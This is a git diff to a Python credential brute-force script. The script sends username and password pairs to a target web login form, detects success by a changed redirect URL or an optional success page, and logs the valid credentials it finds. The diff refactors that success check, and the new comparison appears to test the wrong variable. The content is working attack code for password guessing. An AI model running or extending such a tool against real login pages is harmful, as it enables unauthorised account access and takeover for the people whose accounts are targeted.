@@ -35,16 +35,31 @@ if (args.password_file is not None):
 # the function that will be used to test the login it is pretty straight forward, it just sends a request to the website
 # and checks if the website redirects to a page (i.e dashbord.php, home...)) in other words if the request url changed
 # if so, it means that the login was successful
-def brute_force(username, password):
+def brute_force(username, password, success_page=None):
+    success = False
     session = requests.Session()
     payload = {args.login_param_name: username,
                args.password_param_name: password}
     post_req = session.post(args.url, data=payload)
-    # i will add more conditions to check wether the login was successful or not
-    if (args.url != post_req.url):
-        # as i come accross them and that are not explicit countrary to the usual "incorrect password" etc...
-        # if you have any other conditions to check that would indicate if the login was successful or not you can add them
-
+    # -------------------------------------------------------------------------------------------------------------------- 
+    # here is were i define checks to see if the login was successful or not, and that does not need a failure message
+    # i will add more conditions to check wether the login was successful or not    
+    # as i come accross them and that are not explicit countrary to the usual "incorrect password" etc...   
+    # if you have any other conditions to check that would indicate if the login was successful or not you can add them 
+    # --------------------------------------------------------------------------------------------------------------------
+    if (success_page) and (args.url == success_page):
+        success = True
+    elif (args.url != post_req.url) :
+        success = True
+    # set success to true if one of the above conditions validated, otherwise log that the username/password combination is not valid
+    else :
+        if (verbosity):
+            log.fail(f"{username}:{password} is not a valid login")
+        session.close()
+        sleep(args.wait)
+        
+    # if success is set to true, we log the combination as valid 
+    if success :
         log.info(
             f"found a valid username and password {username}:{password}", bold=True, underline=True)
         # killing all threads before exiting
@@ -53,12 +68,7 @@ def brute_force(username, password):
                 thread.join()
         
         exit(0)
-
-    else:
-        if (verbosity):
-            log.fail(f"{username}:{password} is not a valid login")
-        session.close()
-        sleep(args.wait)
+        
 
 
 def main():
@@ -69,7 +79,6 @@ def main():
     
     for i in range(5):
         success, message = utils.try_connection(args.url, follow_redirects=args.follow_redirects).values()
-        print(success)
         if success: break
         log.error(message)
         sleep(args.wait)
